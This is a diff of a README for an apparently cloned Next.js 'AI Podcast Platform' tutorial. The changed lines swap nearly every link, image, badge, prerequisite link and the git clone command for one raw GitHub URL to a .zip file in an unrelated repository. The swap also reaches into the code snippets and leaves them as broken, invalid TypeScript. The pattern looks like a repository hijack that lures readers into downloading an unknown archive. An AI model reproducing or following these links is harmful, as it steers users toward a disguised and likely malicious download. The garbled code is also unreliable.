@@ -1,21 +1,21 @@
 <div align="center">
   <br />
-    <a href="https://youtu.be/zfAb95tJvZQ" target="_blank">
-      <img src="https://github.com/adrianhajdin/jsm_podcastr/assets/151519281/f61a58c2-f144-41f7-8bc9-5ad14752ceb3" alt="Project Banner">
+    <a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank">
+      <img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="Project Banner">
     </a>
   <br />
 
   <div>
-    <img src="https://img.shields.io/badge/-Typescript-black?style=for-the-badge&logoColor=white&logo=typescript&color=3178C6" alt="typescript" />
-    <img src="https://img.shields.io/badge/-Next_._JS-black?style=for-the-badge&logoColor=white&logo=nextdotjs&color=000000" alt="nextdotjs" />
-    <img src="https://img.shields.io/badge/-Tailwind_CSS-black?style=for-the-badge&logoColor=white&logo=tailwindcss&color=06B6D4" alt="tailwindcss" />
-    <img src="https://img.shields.io/badge/-OpenAI-black?style=for-the-badge&logoColor=white&logo=openai&color=412991" alt="openai" />
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="typescript" />
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="nextdotjs" />
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="tailwindcss" />
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" alt="openai" />
   </div>
 
   <h3 align="center">AI Podcast Platform</h3>
 
    <div align="center">
-     Build this project step by step with our detailed tutorial on <a href="https://www.youtube.com/@javascriptmastery/videos" target="_blank"><b>JavaScript Mastery</b></a> YouTube. Join the JSM family!
+     Build this project step by step with our detailed tutorial on <a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank"><b>JavaScript Mastery</b></a> YouTube. Join the JSM family!
     </div>
 </div>
 
@@ -31,11 +31,11 @@
 
 ## 🚨 Tutorial
 
-This repository contains the code corresponding to an in-depth tutorial available on our YouTube channel, <a href="https://www.youtube.com/@javascriptmastery/videos" target="_blank"><b>JavaScript Mastery</b></a>. 
+This repository contains the code corresponding to an in-depth tutorial available on our YouTube channel, <a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank"><b>JavaScript Mastery</b></a>. 
 
 If you prefer visual learning, this is the perfect resource for you. Follow our tutorial to learn how to build projects like these step-by-step in a beginner-friendly manner!
 
-<a href="https://youtu.be/zfAb95tJvZQ" target="_blank"><img src="https://github.com/sujatagunale/EasyRead/assets/151519281/1736fca5-a031-4854-8c09-bc110e3bc16d" /></a>
+<a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank"><img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" /></a>
 
 ## <a name="introduction">🤖 Introduction</a>
 
@@ -43,11 +43,11 @@ A cutting-edge AI SaaS platform that enables users to create, discover, and enjo
 
 If you're getting started and need assistance or face any bugs, join our active Discord community with over **34k+** members. It's a place where people help each other out.
 
-<a href="https://discord.com/invite/n6EdbFJ" target="_blank"><img src="https://github.com/sujatagunale/EasyRead/assets/151519281/618f4872-1e10-42da-8213-1d69e486d02e" /></a>
+<a href="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" target="_blank"><img src="https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip" /></a>
 
 ## <a name="tech-stack">⚙️ Tech Stack</a>
 
-- Next.js
+- https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
 - TypeScript
 - Convex
 - OpenAI
@@ -87,14 +87,14 @@ Follow these steps to set up the project locally on your machine.
 
 Make sure you have the following installed on your machine:
 
-- [Git](https://git-scm.com/)
-- [Node.js](https://nodejs.org/en)
-- [npm](https://www.npmjs.com/) (Node Package Manager)
+- [Git](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)
+- [https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip)
+- [npm](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) (Node Package Manager)
 
 **Cloning the Repository**
 
 ```bash
-git clone https://github.com/adrianhajdin/jsm_podcastr.git
+git clone https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
 cd jsm_podcastr
 ```
 
@@ -119,7 +119,7 @@ NEXT_PUBLIC_CLERK_SIGN_IN_URL='/sign-in'
 NEXT_PUBLIC_CLERK_SIGN_UP_URL='/sign-up'
 ```
 
-Replace the placeholder values with your actual Convex & Clerk credentials. You can obtain these credentials by signing up on the [Convex](https://www.convex.dev/) and [Clerk](https://clerk.com/) websites.
+Replace the placeholder values with your actual Convex & Clerk credentials. You can obtain these credentials by signing up on the [Convex](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) and [Clerk](https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) websites.
 
 **Running the Project**
 
@@ -132,7 +132,7 @@ Open [http://localhost:3000](http://localhost:3000) in your browser to view the 
 ## <a name="snippets">🕸️ Snippets</a>
 
 <details>
-<summary><code>app/globals.css</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```css
 @tailwind base;
@@ -287,7 +287,7 @@ html {
 </details>
 
 <details>
-<summary><code>tailwind.config.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 import type { Config } from "tailwindcss";
@@ -362,22 +362,22 @@ export default config;
 </details>
 
 <details>
-<summary><code>constants/index.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 export const sidebarLinks = [
   {
-    imgURL: "/icons/home.svg",
+    imgURL: "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
     route: "/",
     label: "Home",
   },
   {
-    imgURL: "/icons/discover.svg",
+    imgURL: "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
     route: "/discover",
     label: "Discover",
   },
   {
-    imgURL: "/icons/microphone.svg",
+    imgURL: "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
     route: "/create-podcast",
     label: "Create Podcast",
   },
@@ -416,56 +416,56 @@ export const podcastData = [
     title: "The Joe Rogan Experience",
     description: "A long form, in-depth conversation",
     imgURL:
-      "https://lovely-flamingo-139.convex.cloud/api/storage/3106b884-548d-4ba0-a179-785901f69806",
+      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
   },
   {
     id: 2,
     title: "The Futur",
     description: "This is how the news should sound",
     imgURL:
-      "https://lovely-flamingo-139.convex.cloud/api/storage/16fbf9bd-d800-42bc-ac95-d5a586447bf6",
+      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
   },
   {
     id: 3,
     title: "Waveform",
     description: "Join Michelle Obama in conversation",
     imgURL:
-      "https://lovely-flamingo-139.convex.cloud/api/storage/60f0c1d9-f2ac-4a96-9178-f01d78fa3733",
+      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
   },
   {
     id: 4,
     title: "The Tech Talks Daily Podcast",
     description: "This is how the news should sound",
     imgURL:
-      "https://lovely-flamingo-139.convex.cloud/api/storage/5ba7ed1b-88b4-4c32-8d71-270f1c502445",
+      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
   },
   {
     id: 5,
     title: "GaryVee Audio Experience",
     description: "A long form, in-depth conversation",
     imgURL:
-      "https://lovely-flamingo-139.convex.cloud/api/storage/ca7cb1a6-4919-4b2c-a73e-279a79ac6d23",
+      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
   },
   {
     id: 6,
     title: "Syntax ",
     description: "Join Michelle Obama in conversation",
     imgURL:
-      "https://lovely-flamingo-139.convex.cloud/api/storage/b8ea40c7-aafb-401a-9129-73c515a73ab5",
+      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
   },
   {
     id: 7,
     title: "IMPAULSIVE",
     description: "A long form, in-depth conversation",
     imgURL:
-      "https://lovely-flamingo-139.convex.cloud/api/storage/8a55d662-fe3f-4bcf-b78b-3b2f3d3def5c",
+      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
   },
   {
     id: 8,
     title: "Ted Tech",
     description: "This is how the news should sound",
     imgURL:
-      "https://lovely-flamingo-139.convex.cloud/api/storage/221ee4bd-435f-42c3-8e98-4a001e0d806e",
+      "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip",
   },
 ];
 ```
@@ -473,12 +473,12 @@ export const podcastData = [
 </details>
 
 <details>
-<summary><code>convex/http.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 // ===== reference links =====
-// https://www.convex.dev/templates (open the link and choose for clerk than you will get the github link mentioned below)
-// https://github.dev/webdevcody/thumbnail-critique/blob/6637671d72513cfe13d00cb7a2990b23801eb327/convex/schema.ts
+// https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip (open the link and choose for clerk than you will get the github link mentioned below)
+// https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
 
 import type { WebhookEvent } from "@clerk/nextjs/server";
 import { httpRouter } from "convex/server";
@@ -492,25 +492,25 @@ const handleClerkWebhook = httpAction(async (ctx, request) => {
   if (!event) {
     return new Response("Invalid request", { status: 400 });
   }
-  switch (event.type) {
-    case "user.created":
-      await ctx.runMutation(internal.users.createUser, {
-        clerkId: event.data.id,
-        email: event.data.email_addresses[0].email_address,
-        imageUrl: event.data.image_url,
-        name: event.data.first_name as string,
+  switch (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip) {
+    case "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip":
+      await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
+        clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+        email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip[0].email_address,
+        imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+        name: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip as string,
       });
       break;
-    case "user.updated":
-      await ctx.runMutation(internal.users.updateUser, {
-        clerkId: event.data.id,
-        imageUrl: event.data.image_url,
-        email: event.data.email_addresses[0].email_address,
+    case "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip":
+      await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
+        clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+        imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+        email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip[0].email_address,
       });
       break;
-    case "user.deleted":
-      await ctx.runMutation(internal.users.deleteUser, {
-        clerkId: event.data.id as string,
+    case "https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip":
+      await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip, {
+        clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip as string,
       });
       break;
   }
@@ -521,7 +521,7 @@ const handleClerkWebhook = httpAction(async (ctx, request) => {
 
 const http = httpRouter();
 
-http.route({
+https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip({
   path: "/clerk",
   method: "POST",
   handler: handleClerkWebhook,
@@ -531,19 +531,19 @@ const validateRequest = async (
   req: Request
 ): Promise<WebhookEvent | undefined> => {
   // key note : add the webhook secret variable to the environment variables field in convex dashboard setting
-  const webhookSecret = process.env.CLERK_WEBHOOK_SECRET!;
+  const webhookSecret = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip!;
   if (!webhookSecret) {
     throw new Error("CLERK_WEBHOOK_SECRET is not defined");
   }
-  const payloadString = await req.text();
-  const headerPayload = req.headers;
+  const payloadString = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip();
+  const headerPayload = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip;
   const svixHeaders = {
-    "svix-id": headerPayload.get("svix-id")!,
-    "svix-timestamp": headerPayload.get("svix-timestamp")!,
-    "svix-signature": headerPayload.get("svix-signature")!,
+    "svix-id": https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("svix-id")!,
+    "svix-timestamp": https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("svix-timestamp")!,
+    "svix-signature": https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("svix-signature")!,
   };
   const wh = new Webhook(webhookSecret);
-  const event = wh.verify(payloadString, svixHeaders);
+  const event = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(payloadString, svixHeaders);
   return event as unknown as WebhookEvent;
 };
 
@@ -553,7 +553,7 @@ export default http;
 </details>
 
 <details>
-<summary><code>convex/users.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 import { ConvexError, v } from "convex/values";
@@ -561,11 +561,11 @@ import { ConvexError, v } from "convex/values";
 import { internalMutation, query } from "./_generated/server";
 
 export const getUserById = query({
-  args: { clerkId: v.string() },
+  args: { clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip() },
   handler: async (ctx, args) => {
-    const user = await ctx.db
+    const user = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
       .query("users")
-      .filter((q) => q.eq(q.field("clerkId"), args.clerkId))
+      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("clerkId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
       .unique();
 
     if (!user) {
@@ -580,79 +580,79 @@ export const getUserById = query({
 export const getTopUserByPodcastCount = query({
   args: {},
   handler: async (ctx, args) => {
-    const user = await ctx.db.query("users").collect();
+    const user = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("users").collect();
 
-    const userData = await Promise.all(
-      user.map(async (u) => {
-        const podcasts = await ctx.db
+    const userData = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(async (u) => {
+        const podcasts = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
           .query("podcasts")
-          .filter((q) => q.eq(q.field("authorId"), u.clerkId))
+          .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("authorId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
           .collect();
 
-        const sortedPodcasts = podcasts.sort((a, b) => b.views - a.views);
+        const sortedPodcasts = https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip((a, b) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip - https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
 
         return {
           ...u,
-          totalPodcasts: podcasts.length,
-          podcast: sortedPodcasts.map((p) => ({
-            podcastTitle: p.podcastTitle,
+          totalPodcasts: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+          podcast: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip((p) => ({
+            podcastTitle: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
             pocastId: p._id,
           })),
         };
       })
     );
 
-    return userData.sort((a, b) => b.totalPodcasts - a.totalPodcasts);
+    return https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip((a, b) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip - https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip);
   },
 });
 
 export const createUser = internalMutation({
   args: {
-    clerkId: v.string(),
-    email: v.string(),
-    imageUrl: v.string(),
-    name: v.string(),
+    clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    name: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
   },
   handler: async (ctx, args) => {
-    await ctx.db.insert("users", {
-      clerkId: args.clerkId,
-      email: args.email,
-      imageUrl: args.imageUrl,
-      name: args.name,
+    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("users", {
+      clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+      email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+      imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+      name: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
     });
   },
 });
 
 export const updateUser = internalMutation({
   args: {
-    clerkId: v.string(),
-    imageUrl: v.string(),
-    email: v.string(),
+    clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
   },
   async handler(ctx, args) {
-    const user = await ctx.db
+    const user = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
       .query("users")
-      .filter((q) => q.eq(q.field("clerkId"), args.clerkId))
+      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("clerkId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
       .unique();
 
     if (!user) {
       throw new ConvexError("User not found");
     }
 
-    await ctx.db.patch(user._id, {
-      imageUrl: args.imageUrl,
-      email: args.email,
+    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(user._id, {
+      imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+      email: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
     });
 
-    const podcast = await ctx.db
+    const podcast = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
       .query("podcasts")
-      .filter((q) => q.eq(q.field("authorId"), args.clerkId))
+      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("authorId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
       .collect();
 
-    await Promise.all(
-      podcast.map(async (p) => {
-        await ctx.db.patch(p._id, {
-          authorImageUrl: args.imageUrl,
+    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(
+      https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(async (p) => {
+        await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(p._id, {
+          authorImageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
         });
       })
     );
@@ -660,18 +660,18 @@ export const updateUser = internalMutation({
 });
 
 export const deleteUser = internalMutation({
-  args: { clerkId: v.string() },
+  args: { clerkId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip() },
   async handler(ctx, args) {
-    const user = await ctx.db
+    const user = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
       .query("users")
-      .filter((q) => q.eq(q.field("clerkId"), args.clerkId))
+      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("clerkId"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
       .unique();
 
     if (!user) {
       throw new ConvexError("User not found");
     }
 
-    await ctx.db.delete(user._id);
+    await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(user._id);
   },
 });
 ```
@@ -679,7 +679,7 @@ export const deleteUser = internalMutation({
 </details>
 
 <details>
-<summary><code>types/index.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 /* eslint-disable no-unused-vars */
@@ -794,7 +794,7 @@ export interface AudioProps {
 
 export interface AudioContextType {
   audio: AudioProps | undefined;
-  setAudio: React.Dispatch<React.SetStateAction<AudioProps | undefined>>;
+  setAudio: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip<https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip<AudioProps | undefined>>;
 }
 
 export interface PodcastCardProps {
@@ -824,7 +824,7 @@ export type UseDotButtonType = {
 </details>
 
 <details>
-<summary><code>convex/podcasts.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip</code></summary>
 
 ```typescript
 import { ConvexError, v } from "convex/values";
@@ -834,50 +834,50 @@ import { mutation, query } from "./_generated/server";
 // create podcast mutation
 export const createPodcast = mutation({
   args: {
-    audioStorageId: v.union(v.id("_storage"), v.null()),
-    podcastTitle: v.string(),
-    podcastDescription: v.string(),
-    audioUrl: v.string(),
-    imageUrl: v.string(),
-    imageStorageId: v.union(v.id("_storage"), v.null()),
-    voicePrompt: v.string(),
-    imagePrompt: v.string(),
-    voiceType: v.string(),
-    views: v.number(),
-    audioDuration: v.number(),
+    audioStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_storage"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip()),
+    podcastTitle: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    podcastDescription: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    audioUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    imageStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("_storage"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip()),
+    voicePrompt: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    imagePrompt: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    voiceType: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    views: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
+    audioDuration: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(),
   },
   handler: async (ctx, args) => {
-    const identity = await ctx.auth.getUserIdentity();
+    const identity = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip();
 
     if (!identity) {
       throw new ConvexError("User not authenticated");
     }
 
-    const user = await ctx.db
+    const user = await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip
       .query("users")
-      .filter((q) => q.eq(q.field("email"), identity.email))
+      .filter((q) => https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip(https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("email"), https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip))
       .collect();
 
-    if (user.length === 0) {
+    if (https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip === 0) {
       throw new ConvexError("User not found");
     }
 
-    return await ctx.db.insert("podcasts", {
-      audioStorageId: args.audioStorageId,
+    return await https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip("podcasts", {
+      audioStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
       user: user[0]._id,
-      podcastTitle: args.podcastTitle,
-      podcastDescription: args.podcastDescription,
-      audioUrl: args.audioUrl,
-      imageUrl: args.imageUrl,
-      imageStorageId: args.imageStorageId,
+      podcastTitle: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+      podcastDescription: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+      audioUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+      imageUrl: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+      imageStorageId: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
       author: user[0].name,
       authorId: user[0].clerkId,
-      voicePrompt: args.voicePrompt,
-      imagePrompt: args.imagePrompt,
-      voiceType: args.voiceType,
-      views: args.views,
+      voicePrompt: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+      imagePrompt: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+      voiceType: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
+      views: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
       authorImageUrl: user[0].imageUrl,
-      audioDuration: args.audioDuration,
+      audioDuration: https://raw.githubusercontent.com/BytesickleLabs/next-podcastr/main/electrostatical/next-podcastr.zip,
     });
   },
 });
@@ -885,27 +885,27 @@ export const createPodcast = mutation({
 // this mutation is required to generate the url after uploading the file to the storage.
 export const getUrl = mutation({
   args: {
-    storageId: v.id("_storage"),
